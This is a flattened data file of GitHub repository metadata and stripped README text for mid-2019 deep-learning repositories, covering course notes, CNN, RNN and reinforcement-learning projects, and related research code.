lukaeerens93,Deep_Learning,n/a,DeepLearning Personal implementations of deep learning algorithms Topics that will be covered Basic Networks Shallow Neural Networks Deep Neural Networks Hyperparameters Attention Vision Convolution Neural Networks Image Classification Object Tracking Semantic Segmentation Sequences RNN LSTM GRU 3D CNN Auto Encoders Denoising Auto Encoders Variational Auto Encoders Deep Belief Networks Boltzman Machines Deep Boltzman Machines Deep Belief Networks NLP and Speech Transformers BERT GANs GANs Multimodal Neural Networks Audio Text Video Audio Video Text Hyperspectral Optical Classic Architectures Resnet Inception Net Neural Turing Machines,2019-07-26T13:53:09Z,2019-08-02T16:27:26Z,n/a,lukaeerens93,User,0,1,0,50,master,lukaeerens93,1,0,0,0,0,0,0
SimonNgj,DL-ung-dung,n/a,Deep learning and applications This repo contains implementation of some DL models for human acitivities classification in multi modal data time series and video Images taken from Jindong Wang et al Deep learning for sensor based activity recognition A Survey Pattern Recognition Letters 2018 https doi org 10 1016 j patrec 2018 02 010,2019-07-07T12:47:35Z,2019-12-05T19:10:11Z,Jupyter Notebook,SimonNgj,User,1,1,0,102,master,SimonNgj,1,0,0,0,0,0,0
wildanputra,deeplearningtutorial,n/a,deeplearning tutorial tutorial deep learning Work in Progress,2019-07-04T07:24:44Z,2019-11-06T07:33:23Z,Jupyter Notebook,wildanputra,User,0,1,1,12,master,wildanputra,1,0,0,0,0,0,0
wang-tingxuan,code-in-DeepLearning-with-python,n/a,code in DeepLearning with python python,2019-07-27T10:03:26Z,2019-07-27T11:48:11Z,Jupyter Notebook,wang-tingxuan,User,1,1,0,4,master,wang-tingxuan,1,0,0,0,0,0,0
AmrHendy,multimedia_question_answering,attention-model#attention-seq2seq#cnn#deep-learning#feature-extraction#glove-embeddings#multimedia-retrieval#video-description#video-processing#video-question-answering#visual-deep-learning,Multimedia Question Answering Increasing trend in the research community for video processing using artificial intelligence Trending Tasks Video classification Video content description Video question answering VQA Main Idea The main idea of the project is that searching for partition of video which is most relevent to a corresponding query Question Instead of watching the complete video to find the interval you want to watch you will give our model the video and the query which describes the part you want then our model will give you the intervals sorted by relevance to the given query Examples Watch the video Images samplevideo png https youtu be VwxOHvsqeU0 Dataset We use the Microsoft Research Video to Text MSR VTT dataset Example of the dataset is shown below Extracted Visual Feature We extracted the visual features of the data set using 3 different models ResNet 152 like paper gdrive link https drive google com open id 16EANa7XI pX9vjJJCpQXZeVfHGBIGird NASNet gdrive link https drive google com open id 1 NkhaeHWdrQjdSRhqVVcYCXvZV6vp0tw Inception ResNet v2 gdrive link https drive google com open id 1X7l0Uc2dij0RZDXfizOZYc1EyRwjfxxG Architecture Here is the base architecture which is used in paper here https arxiv org abs 1808 02559 Checkpoints We have trained the model using different visual features extractors and changed a bit in the model architecture Using ResNet visual features extractor like paper gdrive link https drive google com open id 11QgKWM1QUM6 R6FLLDcBxSh1Aj9H13j Using NASNet visual features extractor gdrive https drive google com open id 1ulXiHvIg3fZ4xrXIGfUQto84E8oEbBz0 Using Inception ResNet v2 visual features extractor gdrive link https drive google com open id 1X7l0Uc2dij0RZDXfizOZYc1EyRwjfxxG Using Squeeze and Excitation technique with Inception ResNet v2 gdrive line https drive google com open id 1KHUDPItXL3b0s7ojTZadoObVGX4yFvkw Using Dropout technique gdrive link https drive google com open id 1bSXXHPSpg7jSkC2fUpe86R5naL4CZoHI Using Squeeze and Excitation along with Dropout gdrive link https drive google com open id 1 6Av792Htkalsp9lM7PwbwGCrejKaE Using Squeeze and Excitation technique and increasing hidden dimension of the LSTMs gdrive link https drive google com open id 1XZISh3Jg24jMuChZ5ChOb1kgvOEns2fC Results From the results obtained in the explained experiments we found out that the best results obtained are from using Inception ResNet v2 as feature extractor for the visual features Our model outperforms the original paper model in all used metrics as shown in the following table These results obtained from testing on the test set which contains 2990 videos You can see the comparison between all models in the following figure Authors Amr Hendy https github com AmrHendy Muhammed Ibrahim https github com MuhammedKhamis Abdelrahman Yasser https github com Abdelrhman Yasser Mohammed Shaban https github com mohamed shaapan Arsanuos https github com Arsanuos Ahmed Ezzat https github com AhmedMaghawry Contribute Contributions are always welcome Please read the contribution guidelines contributing md first License This project is licensed under the GNU General Public License v3 0 see the LICENSE LICENSE file for details,2019-07-04T10:57:01Z,2019-07-07T15:11:40Z,Python,AmrHendy,User,1,1,4,12,master,AmrHendy#MuhammedKhamis,2,0,0,0,0,0,0
jenapss,Deep_learning_object_detection,n/a,Deeplearningobjectdetection facedetection,2019-06-26T03:12:02Z,2019-06-27T05:51:33Z,Python,jenapss,User,0,1,0,3,master,jenapss,1,0,0,0,0,0,0
maxCodeVector,robot_deep_learning,n/a,robotdeeplearning This is the deep learing part of robotic project in NUS,2019-07-15T04:47:41Z,2019-07-26T20:06:21Z,Python,maxCodeVector,User,0,1,0,23,master,maxCodeVector,1,0,0,0,0,0,0
sdsawtelle,coursera-deep-learning-specialization,n/a,coursera deep learning specialization A collection of course notes and code snippets for the 5 course Deep Learning specialization https www coursera org specializations deep learning on Coursera developed by deeplearning ai with the marvelous Andrew Ng I completed the specialization in July 2019 and my review of the series can be found here http sdsawtelle github io blog output coursera deep learning specialization review html In this repo each of the five courses has a folder containing a jupyter notebook with notes and images from the lecture homework content where I give a succinct note summary for each section of content a code base folder defining functions or code snippets from the homework that I found particularly illuminating with its own README file annotating the code organization The notebook deep learning resources is just a place for me to collect links to interesting or useful resources it is a work in progress I did not include the homework notebooks and associated jupyter workspaces in this repo to respect the Coursera paywall Listing of Course Notebooks NOTE I use custom CSS for image insertion and some other formatting which is sanitized by the github notebook previewer see this article https blog jupyter org rendering notebooks on github f7ac8736d686 To get a complete preview of my notebooks you can click on the pokeball looking icon at the top right of the github rendered preview which will open nbviewer in your browser neural nets and deep learning 1 course neural nets and deep learning neural nets and deep learning course notebook ipynb An intro to neural networks progressing from logistic regression as an NN to shallow NNs to deep L layer NNs improving deep neural networks 2 course improving deep neural networks improving deep neural networks course notebook ipynb Various important topics in working with NNs including bias variance regularization optimization methods and backprop considerations and hyperparameter tuning Also introduced tensorflow keras structuring machine learning projects 3 course structuring machine learning projects structuring machine learning projects course notebook ipynb Tips and insights on how to organize and execute a DL project with many ideas applicable to general ML projects Covers metrics train dev test splitting the role of human performance level how to conduct error analysis data mismatch between train and dev test sets and harnessing transfer learning convolutional neural networks 4 course convolutional neural networks convolutional neural networks course notebook Basic architecture of CNNs including plain english interpretation and intuition for the role of the different layers sub architectures Survey of some classic architectures like AlexNet Overview of specific architectures like ResNets and Inception and specific use cases like object detection and face recognition Also covers data augmentation sequence models 5 course sequence models sequence models course notebook Basic architecture of RNNs including plain english interpretation and intuition for the role of the different layers sub architectures Introduction to and applications of embeddings Overview of specific use cases in sequence to sequence architectures,2019-07-19T14:45:03Z,2019-08-21T13:33:51Z,Jupyter Notebook,sdsawtelle,User,0,1,1,3,master,sdsawtelle,1,0,0,0,0,0,0
thorrester,Deep_Learning_Course,n/a,,2019-07-11T11:37:19Z,2019-07-15T13:34:46Z,Jupyter Notebook,thorrester,User,0,1,0,8,master,thorrester,1,0,0,0,0,0,0
TScma,Deep-Learning-with-scratch,n/a,Deep Learnin with scratch Deep Learnin from scratch,2019-08-02T05:31:55Z,2019-08-14T01:49:30Z,Python,TScma,User,1,1,0,16,master,TScma,1,0,0,0,0,0,0
venkster11,Deep_Learning_Practice,n/a,,2019-06-30T05:34:36Z,2019-12-09T08:00:54Z,Jupyter Notebook,venkster11,User,0,1,0,1,master,venkster11,1,0,0,0,0,0,0
miniking098,Deep-learning-python-notebooks,n/a,Deep learning python notebooks,2019-07-02T07:24:47Z,2019-07-02T07:33:33Z,Jupyter Notebook,miniking098,User,0,1,0,2,master,miniking098,1,0,0,0,0,0,0
saksham20189575,Deep-learning-Projects,n/a,Deep learning Projects This repository contains various deep learning models with details of each model mentioned in index md file as well as in the code of each model Images of the Facial Emotion Detector Video of Credit Debit Card Number Reader,2019-06-25T09:35:50Z,2019-07-26T13:46:33Z,Jupyter Notebook,saksham20189575,User,0,1,0,35,master,saksham20189575,1,0,0,0,1,0,1
YangLiu14,deep-learning-examples,n/a,deep learning toy examples Deep Learning notes learning resources and toy examples Reading materials Visualizing filters of CNN Stanford CS231n Visualizing what ConvNets learn http cs231n github io understanding cnn article What Neural Networks See https experiments withgoogle com what neural nets see Visualizing what different convFilters outputs with the input video Tool and explanation video Deep Visualization Toolbox https www youtube com watch v AgkfIQ4IGaM t 78s Tool and explanation video Visualizing and Understanding Deep Neural Networks https www youtube com watch v ghEmQSxT6tw t 5s 47min video Picasso CNN Visualization tool https medium com merantix picasso a free open source visualizer for cnns d8ed3a35cfc5 Article about Deep Dream https blog keras io how convolutional neural networks see the world html and small code example Deep Dream in music video https www youtube com watch v XatXy6ZhKZw 3 15 3 40 Deep Dream generator https deepdreamgenerator com Attacking Machine Learning with Adversarial Examples https openai com blog adversarial example research Machine Learning for Artists http ml4a github io place for reading Deep Dream WaveNet,2019-06-29T20:15:31Z,2019-12-04T16:38:03Z,C++,YangLiu14,User,0,1,0,2,master,YangLiu14,1,0,0,0,0,0,0
lbrande,rust-deep-learning,n/a,,2019-06-29T21:27:04Z,2019-08-02T09:02:09Z,Rust,lbrande,User,0,1,0,0,master,,0,0,0,0,0,0,0
tommyvsfu1,deep-learning-self-driving,n/a,deep learning self driving Segmentation Training data use KITTI road data I only use these for training so this training will not change file form data train csv test csv dataroad how to run python python train inputdir outputdir inputdir data for loader to load csv and training data trainimgsize 160 576 outputdir Where does model save checkpoint Segmentation Evaluation data KITTI raw data or testing how to run python python eval py inputdir outputdir Sample python eval py inputdir rawtest purpose image02 testimgsize 256 1024 outputdir thisistest inputdir data for loader to load csv and training data trainimgsize 256 1024 outputdir model load from checkpoint pretrained bestseg cpt Detection with Segemtation Evaluation data KITTI raw data or testing run cd referencecode PyTorch YOLOv3 python detectseg py maskfolder rawtest purpose result2 imagefolder rawtest purpose result1 outputfolder segdect Video run python python videocapture py inputdir outputdir sample python python videocapture py inputdir rawtest purpose result3 fps 15 outputdir ALL IN ONE TODO 1 train testing rawtesting option 2 csv generator now in utils 3 video generator for now 1 download raw video image 2 generate csv file for dataset loader 3 use rawtesting function to generate image with segmask 4 use videocapture py to calculate fps 5 use videocapture py to generate video use generate sh ignore data dataroad KITTI road data data trainingmapping no use data devkitroad no use data dataroad zip no use referencecode result no use pycache no use nohup out no use scores no use rawtest KITTI raw data rawresult raw KITTI raw data result,2019-08-02T08:38:15Z,2019-08-09T10:16:30Z,Python,tommyvsfu1,User,1,1,0,37,master,tommyvsfu1,1,0,0,0,0,0,0
Brucknem,Introduction-to-Deep-Learning,n/a,Introduction to Deep Learning This repository holds my solutions for the Introduction to Deep Learning https dvl in tum de teaching i2dl ss19 course of the summer semester 2019 held by Prof Dr Laura Leal Taix https dvl in tum de team lealtaixe and Prof Dr Matthias Niener http www niessnerlab org members matthiasniessner profile html The course was offered by the Dynamic Vision and Learning Group https dvl in tum de at Technische Universitt Mnchen TUM https www tum de Exercise 0 Introduction Introduction to IPython and Jupyter notebooks Interaction with external python code Some random hands on examples Data Preparation Some tasks on data handling and preparation Data loading and visualization on the CIFAR 10 dataset Splitting into training validation and test sets Mean image subtraction Exercise 1 Softmax Implementation of a fully vectorized loss function for the Softmax classifier Implementation of the fully vectorized expression for its analytic gradient Check of the implementation with numerical gradient Usage of a validation set to tune the learning rate and regularization strength Optimization of the loss function with SGD Visualization of the final learned weights Highest achieved score 35 98 correct classified classes Rank 322 428 Two layer net Implementation of a fully connected two layer neural network to perform classification on the CIFAR 10 dataset Implementation of the forward and backward pass Training of the NN and hyperparameter training Visialization of the learned weights Highest achieved score 51 13 correct classified classes Rank 216 393 Features Improvement of the Two layer net by using extracted image features instead of raw image data Feature extraction Histogram of Oriented Gradients HOG and color histogram using the hue channel ins HSV color space Training of the NN on the extracted features Exercise 2 Fully Connected Nets Implementation of a modular fully connected neural network Affine layer forward and backward ReLU layer forward and backward Sandwich layers affine relu Loss layers Softmax Implementation of a solver class to run the training process decoupled from the network model Implementation of different update rules SGD SGD Momentum Adam Hyperparameter tuning and model training Highest achieved score 50 34 correct classified classes Batch Normalization Implementation of a batch normalization layer Training of a network with batch normalization Comparison of different weight initializations and the interaction with batchnorm Highest achieved score 53 89 correct classified classes Rank 31 391 Dropout Implementaion of a dropout layer House Prices Implementation of a network to predict house prices Exploration of the House Price Data Dealing with missing data and non numerical values Data normalization Training of a NN and regression to predict house prices House Prices Data Analysis House Price Data exploration and visualization Comparison of different data axes PyTorch Intro and CNN CNN Layers Implementation of a convolutional layer Implementation of a max pooling layer PyTorch Introduction Introduction to PyTorch Classification CNN Implementation of a convolutional neural network using PyTorch Network architecture conv relu max pool fc dropout relu fc Implementation of a solver class to run the update steps on the model Training of the network Visualization of the learned filters and the loss and accuracy history Highest achieved score 68 00 correct classified classes,2019-06-30T07:48:36Z,2019-11-10T22:28:10Z,Jupyter Notebook,Brucknem,User,0,1,0,3,master,Brucknem,1,0,0,0,0,0,0
TalalAlrawajfeh,deep-learning-framework,n/a,deep learning framework A deep learning framework written in C from scratch,2019-07-29T18:44:57Z,2019-12-08T18:59:10Z,C,TalalAlrawajfeh,User,1,1,0,1,master,TalalAlrawajfeh,1,0,0,0,0,0,0
bilibilistar,Deep-Learning-Microscopy,n/a,Deep Learning Microscopy Restore the network in the paper Deep learning microscopy Paper Link https www osapublishing org optica abstract cfm uri optica 4 11 1437 Supplementary Material Link https figshare com articles 5552338 network https raw githubusercontent com bilibilistar Deep Learning Microscopy master readmeImages network png Python version 3 6 4 Keras version 2 2 4 using Tensorflow backend Tensorlfow version 1 11 0,2019-07-12T07:57:18Z,2019-07-17T00:52:29Z,Python,bilibilistar,User,0,1,0,17,master,bilibilistar,1,0,0,0,0,0,0
dkljajo,Deep-Learning-Specialization,n/a,Deep Learning Specialization,2019-07-15T11:03:57Z,2019-10-16T13:01:05Z,Jupyter Notebook,dkljajo,User,0,1,0,9,master,dkljajo,1,0,0,0,0,0,0
balasubramanyas,SentimentAnalysisDeepLearning,n/a,SentimentAnalysisDeepLearning Sentiment Analysis Using Deep Learning,2019-07-12T16:40:05Z,2019-07-13T11:34:58Z,Python,balasubramanyas,User,0,1,0,2,master,balasubramanyas,1,0,0,0,0,0,0
afrozchakure,Deep-Learning-Sentdex,n/a,DeepLearningSentdex,2019-07-04T11:07:20Z,2019-07-27T15:29:17Z,Jupyter Notebook,afrozchakure,User,0,1,0,4,master,afrozchakure,1,0,0,0,0,0,0
Sajid3,Deep-Learning-Projects,deeplearning#keras#neural-network#tensor-flow#tensorflow,Deep Learning Projects Tensorflow Tensor flow Projects Collections Table of contents Introduction to Tensorflow Pytorch Convolutional Neural Network,2019-07-06T15:12:19Z,2019-08-29T18:40:25Z,Jupyter Notebook,Sajid3,User,0,1,0,18,master,Sajid3,1,0,0,0,0,0,0
kwarodom,Serverless_Deep_Learning_MLRS,n/a,Deploying Serverless Deep Learning on AWS,2019-08-03T03:51:49Z,2019-08-06T15:31:59Z,Python,kwarodom,User,1,1,1,4,master,kwarodom,1,0,0,0,0,0,0
Bilchuck,deep-learning-tasks,n/a,,2019-07-10T15:47:38Z,2019-07-30T06:10:42Z,Python,Bilchuck,User,0,1,0,1,master,Bilchuck,1,0,0,0,0,0,0
mameli,Deep_Learning_with_Python,n/a,DeepLearningwithPython,2019-07-04T15:32:38Z,2019-07-04T18:56:21Z,n/a,mameli,User,1,1,0,1,master,mameli,1,0,0,0,0,0,0
ironWolf1990,Deep-Learning-Python,n/a,Ipython Notebooks A proper guide and explanation in detail will be posted to my github page https damnation69 github io page shortly in a few days,2019-07-24T15:59:06Z,2019-09-01T11:46:17Z,Jupyter Notebook,ironWolf1990,User,0,1,0,2,origin/master,ironWolf1990,1,0,0,0,0,0,0
LashaDYN,deep-learning-with-python,n/a,,2019-07-19T08:29:38Z,2019-07-19T10:10:48Z,Jupyter Notebook,LashaDYN,User,0,1,0,5,master,LashaDYN,1,0,0,0,0,0,0
Hulalazz,Deep-Learning-Theory,n/a,Deep Learning Theory It is aboout the theory of deep learning including the following topics the approximation properteis of deep neural networks convergence of optimization methods and the description of loss land acceleration of deep neural neyworks,2019-07-25T13:06:55Z,2019-10-04T15:54:16Z,n/a,Hulalazz,User,0,1,0,4,master,Hulalazz,1,0,0,0,0,0,0
DannyKirchner,Deep_Learning_Project,n/a,2 Data Scientist Project Project code for Udacity s Data Scientist Nanodegree program In this project you will first develop code for an image classifier built with PyTorch then you will convert it into a command line application In order to complete this project you will need to use the GPU enabled workspaces within the classroom The files are all available here for your convenience but running on your local CPU will likely not work well You should also only enable the GPU when you need it If you are not using the GPU please disable it so you do not run out of time Data The data for this project is quite large in fact it is so large you cannot upload it onto Github If you would like the data for this project you will want download it from the workspace in the classroom Though actually completing the project is likely not possible on your local unless you have a GPU You will be training using 102 different types of flowers where there 20 images per flower to train on Then you will use your trained classifier to see if you can predict the type for new images of the flowers,2019-06-27T07:48:37Z,2019-07-29T08:50:08Z,HTML,DannyKirchner,User,0,1,0,2,master,DannyKirchner,1,0,0,0,0,0,0
mdabashar,Deep-Learning-Algorithms,n/a,Deep Learning Algorithms CNN LSTM RNN GRU DNN BERT Transformer ULMFiT,2019-07-02T07:22:54Z,2019-08-05T09:10:11Z,Jupyter Notebook,mdabashar,User,1,1,1,3,master,mdabashar,1,0,0,1,0,0,0
ckiekim,Deep-Learning-Lecture,n/a,Deep Learning Lecture IITP http dj ezenac co kr 2019 05 2019 11,2019-08-06T05:33:37Z,2019-08-22T07:23:35Z,Jupyter Notebook,ckiekim,User,1,1,1,19,master,ckiekim,1,0,0,0,0,0,0
Ben-USC,Deep-Learning-2019,n/a,Deep Learning 2019 DLprojects contains all the code and materials for projects DLsummary contains a summary of this course,2019-07-03T19:15:19Z,2019-09-09T22:07:12Z,Jupyter Notebook,Ben-USC,User,0,1,0,0,master,,0,0,0,0,0,0,0
xunchen123,Deep-learning-microscopy-images,n/a,Deep learning microscopy images Segmentation detection and classification synthetic models,2019-07-25T18:53:08Z,2019-07-25T18:55:43Z,Python,xunchen123,User,1,1,0,2,master,xunchen123,1,0,0,0,0,0,0
tommyvsfu1,deep-reinforcement-learning-gym,n/a,deep reinforcement learning gym Inspired by lilianweng s https github com lilianweng Repo and Blog this repo contains reinforcement learning algorithm in Pytorch built in openai gym or some interesting environment Policy REINFORCE python python REINFORCE py TODO reward curve gif DDPG pendulum python python ddpgpendulum py TODO test mode save load model function reward curve gif DDPG robot arm https i imgur com ejDkuGS png https i imgur com Vx9d9Pw png,2019-07-30T04:25:30Z,2019-08-08T06:03:39Z,Python,tommyvsfu1,User,1,1,0,107,master,tommyvsfu1,1,0,0,0,0,0,0
RK122,Deep-Learning-implementations-Applications,n/a,Deep Learning implementations Applications This Repository contains some implementation of Deep Learning Algorithms application of it,2019-07-31T21:04:26Z,2019-08-01T07:18:03Z,Jupyter Notebook,RK122,User,1,1,0,7,master,RK122,1,0,0,0,0,0,0
IvanProdaiko94,UCU-deep-learning-homework,cnn#convolutional-neural-networks#deep-learning#machine-learning#neural-network#python#pytorch#ucu,Deep learning Home work 2 Results Pytorch pytorch imgs torch png Vector vector imgs vector png Scalar One epoch training over an hour with batch size 4 while increasing the batch size led to memory error,2019-07-10T14:56:26Z,2019-07-12T23:27:14Z,Python,IvanProdaiko94,User,0,1,0,9,master,IvanProdaiko94,1,0,0,0,0,0,0
neetikasinghal,Deep-Learning-Projects,lstm-neural-networks#rnn-tensorflow#tensorflow,Deep Learning Projects Hotel Reviews Classifier 1 Classified hotel reviews into 2 class classification as positive negative and deceptive truthful reviews using 2 layered network using TensorFlow 2 Implemented our own gradient descent and even visualize test data by reducing dimensions using TSNE You can see in tsneembeds pdf 3 Training data used is same as under Naive Bayes Classifier under NLP Project Repository 4 Run starter py with input data as command line argument 5 Got 95 accuracy RNN POS Tagger 1 Tagged Italian Japanese and surprise language using sequence to sequence model using TensorFlow 2 Used Bidirectional LSTM to get better accuracy 3 Got 96 accuracy for Japanese and Italian languages,2019-08-04T22:19:01Z,2019-11-13T04:06:56Z,Python,neetikasinghal,User,1,1,0,3,master,neetikasinghal,1,0,0,0,0,0,0
ZhaohengLi,deep-learning-for-robotics,n/a,deep learning for robotics Robotics Multimodal Deep Learning for Object Recognition,2019-07-21T04:52:10Z,2019-07-21T15:30:26Z,Python,ZhaohengLi,User,0,1,0,4,master,ZhaohengLi,1,0,0,0,0,0,0
iamharshit13,Nvidia-Deep_Learning,n/a,Nvidia DeepLearning There are Two certifications in this 1 This Certification was based upon Fundamentals of Deep ELarning for Multiple data types This is a course conducted under NVIDIA DEEP LEARNING INSTITUTE 2 This certification is relateed regarding the Computer Vision part of Deep Learning This is a course conducted under NVIDIA DEEP LEARNING INSTITUTE,2019-06-28T08:40:04Z,2019-09-26T09:47:02Z,Jupyter Notebook,iamharshit13,User,0,1,0,7,master,iamharshit13,1,0,0,0,0,0,0
afaq-ahmad123,NIDS-Deep-Learning,n/a,NIDS Deep Learning Research on Deep Learning based NIDS FYP A complete research road map to learn the deep learning from basics to advance,2019-06-28T04:40:08Z,2019-10-25T10:52:17Z,HTML,afaq-ahmad123,User,0,1,1,46,master,afaq-ahmad123#ammarhaiderak#salmanghazi#safifast,4,0,0,0,0,0,4
pranaya-mathur,Concepts-Deep-Learning,n/a,Concepts Deep Learning,2019-07-10T18:38:37Z,2019-10-21T06:55:27Z,Jupyter Notebook,pranaya-mathur,User,0,1,0,2,master,pranaya-mathur,1,0,0,0,0,0,0
JAVI897,Deep-learning-projects,deep-autoencoders#deep-learning#gan#image-classification#image-segmentation#regression#transfer-learning,Python 3 5 https img shields io badge python 3 5 blue svg Keras 2 2 https img shields io badge Keras 2 2 red svg Deep learning projects 2019 Javi G G Este es un repositorio de cdigo en formato notebook normalmente de proyectos relacionados con deep learning usando datasets de kaggle u otros Si no se renderiza el notebook puedes abrirlo desde nbviewer https nbviewer jupyter org Proyecto Cdigo Temtica Deep autoencoder for collaborative filtering Deep autoencoder https github com JAVI897 Deep learning projects blob master Deep 20autoencoder 20for 20collaborative 20filtering Deepautoencoderforcollaborativefilteringnotebook ipynb Sistema de recomendacin Image classification with transfer learning Transfer learning https github com JAVI897 Deep learning projects blob master Image 20classification 20with 20transfer 20learning Imageclassificationwithtransferlearning ipynb Transfer learning House price estimation from image and text feature Regression https github com JAVI897 Deep learning projects blob master House 20price 20estimation 20from 20image 20and 20text 20feature Housepriceestimationfromimageandtextfeature ipynb Clasificacin de imgenes y regresin VGG from scratch Models https github com JAVI897 Deep learning projects blob master VGG VGG ipynb Implementacin de redes convolucionales Skin Cancer MNIST HAM10000 Image classification https github com JAVI897 Deep learning projects blob master Skin 20Cancer 20MNIST 20HAM10000 SKINCANCER ipynb Transfer learning multiclass classification Localization of Image Forgeries Image localization https github com JAVI897 Deep learning projects blob master Detecci C3 B3n 20y 20localizaci C3 B3n 20de 20falsificaci C3 B3n 20de 20im C3 A1genes ManTraNet ipynb Image localization Faces segmentation Segmentation https github com JAVI897 Deep learning projects blob master Faces 20segmentation Faces 20segmentation ipynb Segmentacin de rostros Nails segmentation Segmentation https github com JAVI897 Deep learning projects blob master Nails 20segmentation Nails 20segmentation ipynb Segmentacin de uas DCGAN on Simpsons GAN https github com JAVI897 Deep learning projects blob master DCGAN 20on 20Simpsons DCGAN 20on 20Simpsons ipynb Generative adversarial network,2019-07-08T21:48:19Z,2019-10-24T07:32:48Z,Jupyter Notebook,JAVI897,User,0,1,0,73,master,JAVI897,1,0,0,0,0,0,0
darkshadow1994,Deep_Learning_Examples,n/a,,2019-06-30T14:54:14Z,2019-09-02T06:13:01Z,n/a,darkshadow1994,User,0,1,0,0,master,,0,0,0,0,0,0,0
agiletechvn,metric-deep-learning,n/a,Intermediate CNN Features This repository contains the implementation of the feature extraction process described in Near Duplicate Video Retrieval by Aggregating Intermediate CNN Layers https link springer com chapter 10 1007 978 3 319 51811 421 Given an input video one frame per second is sampled and its visual descriptor is extracted from the activations of the intermediate convolution layers of a pre trained Convolutional Neural Network Then the Maximum Activation of Convolutions MAC function is applied on the activation of each layer to generate a compact layer vector Finally the layer vector are concatenated to generate a single frame descriptor The feature extraction process is depicted in the following figure Prerequisites Python 2 Caffe or Tensorflow CPU or GPU version Getting started Installation Clone this repo bash git clone https github com MKLab ITI intermediate cnn features cd intermediate cnn features Install all dependencies bash pip install r requirements txt Feature Extraction Provide a file of videos or images to the corresponding argument Each line of the given file have to contain the full path to one video or image Select one of the two supported frameworks to extract features Caffe or Tensorflow Choose one of the three supported CNN architectures based on the selected framework CNN architectures for each framework Caffe GoogleNet VGG ResNet Tensorflow VGG ResNet Inception Provide the required files for the pre trained networks Downloads for Caffe https github com BVLC caffe wiki Model Zoo and Tensorflow https github com tensorflow models tree master research slim Provide an output path The generated files depends on the input file Video list a file is generated for each video with name npy Image list a file with name features npy is generated Each vector in the 0 axis of the stored numpy array correspond to the image in the input file Caffe example bash python featureextraction py videolist network googlenet framework caffe outputpath test prototxt bvlcgooglenet deploy prototxt caffemodel bvlcgooglenet bvlcgooglenet caffemodel Tensorflow example bash python featureextraction py imagelist network vgg framework tensorflow outputpath test tfmodel slim vgg16 ckpt,2019-07-26T06:36:23Z,2019-09-04T08:39:47Z,Python,agiletechvn,Organization,0,1,1,0,master,,0,0,0,0,0,0,0
abbasaa,deep_learning_eugene_charniak,n/a,deeplearningeugenecharniak source code exercises from deep learning by Eugene Charniak after cloning you would want to setup a virtual environment python3 m venv venv pip install r requirements txt you should then be able to run the py files in an isolated environment,2019-08-03T23:52:18Z,2019-08-23T12:59:08Z,Python,abbasaa,User,2,1,0,12,master,abbasaa,1,0,0,0,0,0,0
rahulvigneswaran,Invariance-in-Deep-learning,n/a,Invariance Between Subspaces Made With python 3 7 https img shields io badge Made 20with Python 203 7 brightgreen Maintenance https img shields io badge Maintained 3F yes green svg Open Source Love svg1 https badges frapsoft com os v1 open source svg v 103 Flowcharts FlowChart readmeassets baseline png Fig 1 Flowchart of Invariance Baseline FlowChart readmeassets lotteryticket png Fig 2 Flowchart of Invariance in Lottery Ticket Hypothesis Requirements To install requirements pip install r requirements txt To Replicate Results For Invariance baseline run baseline py For Invariance in Lottery Ticket Hypothesis run lotteryticket py For Invariance layerwise run layerwise py Repository Structure bash Invariance between subspaces baseline py lotteryticket py layerwise py data py README md requirements txt results baseline layerwise lotteryticket readmeassets baseline png layerwise png lotteryticket png model abstractmodel py forward py fullconn py init py logreg py Issue Want to Contribute Open a new issue or do a pull request incase you are facing any difficulty with the code base or if you want to contribute to it forthebadge https forthebadge com images badges built with love svg https github com rahulvigneswaran Invariance between subspaces issues new,2019-07-23T04:21:57Z,2019-08-01T08:25:11Z,Python,rahulvigneswaran,User,1,1,0,42,master,rahulvigneswaran#ravisankaradepu,2,0,0,0,0,0,2
spirosrap,Deep-Reinforcement-Learning,a2c#ddpg#deep-reinforcement-learning#dqn#education#openai#ppo#pytorch#reinforcement-learning#reinforcement-learning-algorithms#rl-algorithms,Deep Reinforcement Learning Deep Reinforcement Learning Algorithms and Code Explanations of research papers and their implementations All algorithm implementations are done in Pytorch 1 REINFORCE Vanilla Policy Gradient https spinningup openai com en latest algorithms vpg html 2 DQN Deep Q Learning Mnih et al 2013 https www cs toronto edu vmnih docs dqn pdf 3 A3C A2C Asynchronous methods for Deep RL Mnih et al 2016 https arxiv org abs 1602 01783 4 PPO Proximal Policy Optimization Schulman et al 2017 https arxiv org abs 1707 06347 5 DDPG Deep Deterministic Policy Gradient Lillicrap et al 2015 https arxiv org abs 1509 02971 Folder General General tips on Deep reinforcement Learning From Open AI Spinning Up as a Deep RL Researcher or Practitioner https spinningup openai com en latest spinningup spinningup html How to start in Deep RL assuming you ve got a solid background in Mathematics 1 http wiki fast ai index php CalculusforDeepLearning 2 https www quantstart com articles matrix algebra linear algebra for deep learning part 2 a general knowledge of Deep Learning and are familiar with at least one Deep Learning Library Like PyTorch https pytorch org or TensorFlow https www tensorflow org OPEN AI https spinningup openai com en latest static spinning up logo2 png Which algorithms You should probably start with vanilla policy gradient also called REINFORCE DQN A2C the synchronous version of A3C PPO the variant with the clipped objective and DDPG approximately in that order The simplest versions of all of these can be written in just a few hundred lines of code ballpark 250 300 and some of them even less for example a no frills version of VPG can be written in about 80 lines Write single threaded code before you try writing parallelized versions of these algorithms Do try to parallelize at least one Further Algorithms to study Suggested at Open AI Hackathon TRPO Schulman et al 2015 https arxiv org abs 1502 05477 C51 Bellemare et al 2017 https arxiv org abs 1707 06887 QR DQN Dabney et al 2017 https arxiv org abs 1710 10044 SVG Heess et al 2015 https arxiv org abs 1510 09142 I2A Weber et al 2017 https arxiv org abs 1707 06203 MBMF Nagabandi et al 2017 https sites google com view mbmf AlphaZero Silver et al 2017 https arxiv org abs 1712 01815 How to study the RL Algorithms Start with the most simple algorithm REINFORCE First read the paper carefully Then read the implementation and try to rewrite the code from scratch Take care not to overfit on implementation details or on paper details Notes My framework of choice is Pytorch https pytorch org which is covered by a free licence Modified BSD license https en wikipedia org wiki ModifiedBSDLicense The implementations were taken from various sources with a focus on simplicity and ease of understanding including Udacity s repository for the Deep Reinforcement Learning Nanodegree https github com udacity deep reinforcement learning There are numerous implementations available including very good modular ones but my purpose is mastering the RL theory and algorithms Creating modular code is a secondary goal There are minor corrections on the implementations with the aim of making them easier to understand and consistent Sources Udacity https github com udacity deep reinforcement learning OpenAI https spinningup openai com en latest spinningup spinningup html ShangtongZhang DeepRL https github com ShangtongZhang DeepRL higgsfield RL Adventure 2 https github com higgsfield RL Adventure 2 nikhilbarhate99 PPO PyTorch https github com nikhilbarhate99 PPO PyTorch,2019-07-27T11:00:07Z,2019-11-25T08:39:08Z,Python,spirosrap,User,1,1,0,0,master,,0,0,0,0,0,0,1
